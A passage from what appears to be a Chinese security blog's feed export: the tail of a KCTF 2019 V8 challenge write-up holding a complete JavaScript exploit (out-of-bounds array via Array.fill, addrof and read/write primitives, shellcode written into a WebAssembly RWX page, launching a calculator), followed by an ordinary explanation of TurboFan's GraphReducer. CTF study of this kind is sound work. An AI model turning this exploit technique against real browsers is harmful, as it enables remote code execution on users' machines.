class="keyword">class</span> <span class="title">convert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">this</span>.uint8array=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.float64array=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.uint32array=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(x)<span class="comment">//float64 ==&gt; uint64</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.float64array[<span class="number">0</span>]=x;</span><br><span class="line">        <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt; <span class="number">8</span> ;i ++)</span><br><span class="line">            sum += <span class="keyword">this</span>.uint8array[i]*(<span class="number">0x100</span>**i);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = (x % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = ((x - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">0</span>]=tmp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">1</span>]=tmp[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.float64array[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> conv = <span class="keyword">new</span> convert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> oob = [];</span><br><span class="line"><span class="keyword">let</span> obj = [];</span><br><span class="line"><span class="keyword">let</span> buf = [];</span><br><span class="line">arr.length = <span class="number">0x100</span>;</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">arr.fill(<span class="number">1.1</span>,<span class="number">10</span>,&#123;</span><br><span class="line">    valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        arr.length = <span class="number">2</span>;</span><br><span class="line">        arr.fill(obj);</span><br><span class="line">        oob = [<span class="number">1.1</span>];</span><br><span class="line">        obj = [&#123;<span class="string">"a"</span>:<span class="number">0x41414141</span>,<span class="string">"b"</span>:&#123;&#125;&#125;];</span><br><span class="line">        buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> offset_obj;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt;<span class="number">0x30</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = conv.f2i(oob[i]);</span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="number">0x4141414100000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        offset_obj = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj[<span class="number">0</span>][<span class="string">"b"</span>]=x;</span><br><span class="line">    <span class="keyword">return</span> conv.f2i(oob[offset_obj]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//print(addrof(buf).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> offset_buf ;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i&lt; <span class="number">0x40</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = conv.f2i(oob[i]);</span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="number">0x8</span> &amp;&amp; conv.f2i(oob[i+<span class="number">2</span>]) == <span class="number">0x2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        offset_buf = i +<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//print(conv.f2i(oob[i+1]).toString(16));</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr,value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob[offset_buf] = conv.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> x = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line">    x[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob[offset_buf] = conv.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> x = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf);</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt; <span class="number">8</span> ;i ++)</span><br><span class="line">            sum += x[i]*(<span class="number">0x100</span>**i);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"><span class="keyword">let</span> f_addr = addrof(f) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f_addr ==&gt; 0x"</span>+f_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> share_info_addr = read(f_addr + <span class="number">0x18</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info ==&gt; 0x"</span>+share_info_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> wasm = read(share_info_addr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm ==&gt; 0x"</span>+wasm.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> instance=read(wasm+<span class="number">0x10</span>) <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"instance ==&gt; 0x"</span>+instance.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> rwx_addr=read(instance+<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_addr ==&gt; 0x"</span>+rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="number">0x303d8d4852d23148</span>n, <span class="number">0x253d8d4857000000</span>n, <span class="number">0x153d8d4857000000</span>n, <span class="number">0x24348d4857000000</span>n, <span class="number">0x48000000093d8d48</span>n, <span class="number">0x050f0000003bc0c7</span>n, <span class="number">0x0068732f6e69622f</span>n, <span class="number">0x726f70786500632d</span>n, <span class="number">0x414c505349442074</span>n, <span class="number">0x783b302e303a3d59</span>n, <span class="number">0x00636c6163</span>n]</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i&lt; shellcode.length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    write(rwx_addr+i*<span class="number">8</span>,BigInt(shellcode[i]));</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><p><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/7.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;比赛的时候分析了下..但由于对js不够了解..没想到怎么绕过array.length和end之间的比较.赛后看别人的exp，学到了很多.&lt;/
      
    
    </summary>
    
    
      <category term="v8_exploit" scheme="http://yoursite.com/tags/v8-exploit/"/>
    
  </entry>
  
  <entry>
    <title>V8 Turbofan Node_Reduce</title>
    <link href="http://yoursite.com/2019/09/23/V8-Turbofan-Node-Reduce/"/>
    <id>http://yoursite.com/2019/09/23/V8-Turbofan-Node-Reduce/</id>
    <published>2019-09-23T09:17:05.000Z</published>
    <updated>2019-09-23T11:01:37.696Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/thlorenz/v8-perf/blob/master/compiler.md" target="_blank" rel="noopener">Ignition and TurboFan Compiler Pipeline</a><br><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_0105" target="_blank" rel="noopener">TurboFan TechTalk presentation</a><br>图片都是从这个ppt里截的图</p><h3 id="ReduceGraph"><a href="#ReduceGraph" class="headerlink" title="ReduceGraph"></a>ReduceGraph</h3><p>优化的一些阶段都会进行graph的reduce操作，以typedlowering阶段为例:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct TypedLoweringPhase &#123;</span><br><span class="line">  static const char* phase_name() &#123; return <span class="string">"V8.TFTypedLowering"</span><span class="comment">; &#125;</span></span><br><span class="line">  void Run(PipelineData* data, Zone* temp_zone) &#123;</span><br><span class="line">    GraphReducer graph_reducer(temp_zone, data-&gt;graph(),</span><br><span class="line">                               data-&gt;<span class="keyword">jsgraph()-&gt;Dead());</span></span><br><span class="line"><span class="keyword"> </span>   ...</span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;dead_code_elimination)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;create_lowering)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;constant_folding_reducer)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;typed_lowering)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;typed_optimization)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;simple_reducer)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;checkpoint_elimination)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">AddReducer(data, </span>&amp;graph_reducer, &amp;common_reducer)<span class="comment">;</span></span><br><span class="line">    graph_reducer.ReduceGraph()<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p><code>AddReducer</code>会将对应的reducer加入到reducers_中，reducers_是vector.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> GraphReducer::AddReducer(Reducer* reducer) &#123;</span><br><span class="line">  reducers_.push_back(reducer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Run的最后会执行<code>graph_reducer.ReduceGraph()</code></p><p>ReducerGraph:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> GraphReducer::ReduceGraph<span class="function"><span class="params">()</span> &#123; <span class="title">ReduceNode</span><span class="params">(graph()-&gt;end())</span>; &#125;</span></span><br></pre></td></tr></table></figure></p><p>它以graph的End节点开始进行深度优先搜索.<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/1.png" alt=""></p><h3 id="ReduceNode"><a href="#ReduceNode" class="headerlink" title="ReduceNode"></a>ReduceNode</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void GraphReducer::ReduceNode(Node* node) &#123;</span><br><span class="line">  DCHECK(stack_.<span class="keyword">empty</span>());</span><br><span class="line">  DCHECK(revisit_.<span class="keyword">empty</span>());</span><br><span class="line">  Push(node);<span class="comment">//将node push 到 stack_中</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!stack_.<span class="keyword">empty</span>()) &#123; <span class="comment">//stack_不为空，则进入该分支</span></span><br><span class="line">      <span class="comment">// Process the node on the top of the stack, potentially pushing more or</span></span><br><span class="line">      <span class="comment">// popping the node off the stack.</span></span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!revisit_.<span class="keyword">empty</span>()) &#123;<span class="comment">//revisit_不为空，则进入该分支</span></span><br><span class="line">      <span class="comment">// If the stack becomes empty, revisit any nodes in the revisit queue.</span></span><br><span class="line">      Node* <span class="keyword">const</span> node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      <span class="keyword">if</span> (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        <span class="comment">// state can change while in queue.</span></span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Run all finalizers.</span></span><br><span class="line">      <span class="keyword">for</span> (Reducer* <span class="keyword">const</span> reducer : reducers_) reducer-&gt;Finalize();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if we have new nodes to revisit.</span></span><br><span class="line">      <span class="keyword">if</span> (revisit_.<span class="keyword">empty</span>()) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="comment">//for (;;)</span></span><br><span class="line">  DCHECK(revisit_.<span class="keyword">empty</span>());</span><br><span class="line">  DCHECK(stack_.<span class="keyword">empty</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索的时候维护了两个栈: stack_,revisit_，revisit_中存放搜索完后需要重新访问的节点.<br>当stack_不为空的时候会进入以下分支:<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stack_.empty()) &#123; <span class="comment">//stack_不为空，则进入该分支</span></span><br><span class="line">  <span class="comment">// Process the node on the top of the stack, potentially pushing more or</span></span><br><span class="line">  <span class="comment">// popping the node off the stack.</span></span><br><span class="line">  <span class="built_in">ReduceTop</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure></p><p>ReduceTop这里开始进行深度优先搜索.<br>当搜索完后，stack_为空，如果revisit_不为空，则会进入以下分支:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">else if (!revisit_.empty()) &#123;//revisit_不为空，则进入该分支</span><br><span class="line">      // If the stack becomes empty, revisit any nodes <span class="keyword">in</span> the revisit queue.</span><br><span class="line">      <span class="keyword">Node</span><span class="title">* const</span> <span class="keyword">node</span> <span class="title">= revisit_</span>.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      if (state_.Get(<span class="keyword">node</span><span class="title">) == State</span>::kRevisit) &#123;</span><br><span class="line">        // state can change while <span class="keyword">in</span> queue.</span><br><span class="line">        Push(<span class="keyword">node</span><span class="title">);</span></span><br><span class="line"><span class="title">      &#125;</span></span><br><span class="line"><span class="title">    &#125;</span></span><br></pre></td></tr></table></figure></p><p>将需要重新访问的节点压入stack_中，这样stack_又不为空，就又会继续搜索.<br>当stack_和revisit_都为空时，会进行:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run all finalizers.</span></span><br><span class="line">      <span class="selector-tag">for</span> (Reducer* const <span class="attribute">reducer </span>: reducers_) <span class="selector-tag">reducer-</span>&gt;<span class="selector-tag">Finalize</span>();</span><br></pre></td></tr></table></figure></p><h3 id="ReduceTop"><a href="#ReduceTop" class="headerlink" title="ReduceTop"></a>ReduceTop</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">void GraphReducer::ReduceTop() &#123;</span><br><span class="line">  NodeState&amp; entry = stack_.top();</span><br><span class="line">  <span class="keyword">Node</span><span class="title">* node</span> = entry.node;//获取stack_顶部的<span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">  DCHECK_EQ</span>(State::kOnStack, state_.Get(<span class="keyword">node</span><span class="title">));</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">  /*如果栈顶的这个节点是死节点(即该节点没有input</span>节点)，则直接将其pop掉，然后返回*/</span><br><span class="line">  if (<span class="keyword">node</span><span class="title">-&gt;IsDead</span>()) return Pop();  // <span class="keyword">Node</span> <span class="title">was</span> killed while on stack.</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Node</span><span class="title">::Inputs</span> node_inputs = <span class="keyword">node</span><span class="title">-&gt;inputs</span>();//以该<span class="keyword">node</span><span class="title">的input_location</span>和input_count初始化<span class="keyword">Node</span><span class="title">::Inputs</span></span><br><span class="line"></span><br><span class="line">  // Recurse on an input if necessary.</span><br><span class="line">  int <span class="literal">start</span> = entry.input_index <span class="tag">&lt; node_inputs.count() ? entry.input_index : 0;</span></span><br><span class="line"><span class="tag">  for (int i = start; i &lt; node_inputs.count(); ++i) &#123; //遍历该节点的input节点</span></span><br><span class="line"><span class="tag">    Node* input = node_inputs[i];</span></span><br><span class="line"><span class="tag">    if (input != node &amp;&amp; Recurse(input)) &#123; //如果该input节点没有访问过或没有在栈上，则将其压入栈中,然后返回</span></span><br><span class="line"><span class="tag">      entry.input_index = i + 1; // 压入栈中后，input_index+1 ,下次再遍历的时候就不会再遍历它了.</span></span><br><span class="line"><span class="tag">      return;</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">  &#125;</span></span><br><span class="line"><span class="tag">  for (int i = 0; i &lt; start; ++i) &#123;</span></span><br><span class="line"><span class="tag">    Node* input = node_inputs[i];</span></span><br><span class="line"><span class="tag">    if (input != node &amp;&amp; Recurse(input)) &#123;</span></span><br><span class="line"><span class="tag">      entry.input_index = i + 1;</span></span><br><span class="line"><span class="tag">      return;</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">  &#125;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  // Remember the max node id before reduction.</span></span><br><span class="line"><span class="tag">  NodeId const max_id = static_cast&lt;NodeId&gt;</span>(graph()-&gt;NodeCount() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  // 所有input节点都被访问过了或者在栈上。则对该节点进行reduce.</span><br><span class="line">  Reduction reduction = Reduce(<span class="keyword">node</span><span class="title">);//遍历所有的reducer</span>对节点进行reduce</span><br><span class="line"></span><br><span class="line">  // If there was no reduction, pop &#123;<span class="keyword">node</span><span class="title">&#125; and</span> continue.</span><br><span class="line">  // 没有对该节点进行reduce，则pop掉它</span><br><span class="line">  if (!reduction.Changed()) return Pop();</span><br><span class="line"></span><br><span class="line">  // Check if the reduction is an <span class="keyword">in</span>-place update of the &#123;<span class="keyword">node</span><span class="title">&#125;.</span></span><br><span class="line"><span class="title">  Node</span>* const replacement = reduction.replacement();</span><br><span class="line">  if (replacement == <span class="keyword">node</span><span class="title">) &#123; //replacement</span> == <span class="keyword">node</span> <span class="title">代表该node</span>被更新过</span><br><span class="line">    // <span class="keyword">In</span>-place update of &#123;<span class="keyword">node</span><span class="title">&#125;, may</span> need to recurse on an input.</span><br><span class="line">    <span class="keyword">Node</span><span class="title">::Inputs</span> node_inputs = <span class="keyword">node</span><span class="title">-&gt;inputs</span>();</span><br><span class="line">    for (int i = <span class="number">0</span>; i <span class="tag">&lt; node_inputs.count(); ++i) &#123;</span></span><br><span class="line"><span class="tag">      Node* input = node_inputs[i];</span></span><br><span class="line"><span class="tag">      if (input != node &amp;&amp; Recurse(input)) &#123;</span></span><br><span class="line"><span class="tag">        entry.input_index = i + 1;</span></span><br><span class="line"><span class="tag">        return;</span></span><br><span class="line"><span class="tag">      &#125;</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">  &#125;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  // After reducing the node, pop it off the stack.</span></span><br><span class="line"><span class="tag">  Pop();</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  // Check if we have a new replacement.</span></span><br><span class="line"><span class="tag">  if (replacement != node) &#123;</span></span><br><span class="line"><span class="tag">    Replace(node, replacement, max_id);</span></span><br><span class="line"><span class="tag">  &#125; else &#123;</span></span><br><span class="line"><span class="tag">    // Revisit all uses of the node.</span></span><br><span class="line"><span class="tag">    // 重新访问该节点的use节点，将其压入栈中.</span></span><br><span class="line"><span class="tag">    for (Node* const user : node-&gt;</span>uses()) &#123;</span><br><span class="line">      // Don't revisit this <span class="keyword">node</span> <span class="title">if</span> it refers to itself.</span><br><span class="line">      if (<span class="keyword">user</span> <span class="title">!= node</span>) Revisit(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;//ReduceTop</span><br></pre></td></tr></table></figure><p>这里开始进行递归操作。对栈顶节点的input节点进行遍历，如果input节点没有被访问过或没有在栈上，则将其压入stack_中,然后函数返回.<br>如果栈顶节点的所有input节点都被访问过了则对栈顶节点进行reduce.<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/2.png" alt=""></p><p>如果节点之间存在递归调用，例如:<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/3.png" alt=""><br>这里n3节点作为n6节点的input节点，此时n3节点已经在栈上了，则这里return false，不会将n3再压入栈中.<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool GraphReducer::Recurse(<span class="keyword">Node</span><span class="title">* node</span>) &#123;</span><br><span class="line">  /* onStack, visited */</span><br><span class="line">  if (state_.Get(<span class="keyword">node</span><span class="title">) &gt; State</span>::kRevisit) return <span class="literal">false</span>;</span><br><span class="line">  Push(<span class="keyword">node</span><span class="title">);</span></span><br><span class="line"><span class="title">  return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当n7,n8,n9已经遍历完，遍历到n3的时候，发现n3已经在栈上，则一样可以对n6节点进行reduce.<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/4.png" alt=""></p><p>当一个节点被成功reduce过后，会重新访问该节点的use节点(use节点就是接受该节点作为input节点的节点)，即将use节点压入栈中.<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/5.png" alt=""><br>图中，当reduce n3节点后，会重新把n6节点压入栈中.<br><img src="/2019/09/23/V8-Turbofan-Node-Reduce/6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/thlorenz/v8-perf/blob/master/compiler.md&quot; 
      
    
    </summary>
    
    
      <category term="v8_Turbofan" scheme="http://yoursite.com/tags/v8-Turbofan/"/>
    
  </entry>
  
  <entry>
    <title>35C3_CTF_2018 Krautflare分析</title>
    <link href="http://yoursite.com/2019/09/21/35C3-CTF-2018-Krautflare%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/09/21/35C3-CTF-2018-Krautflare分析/</id>
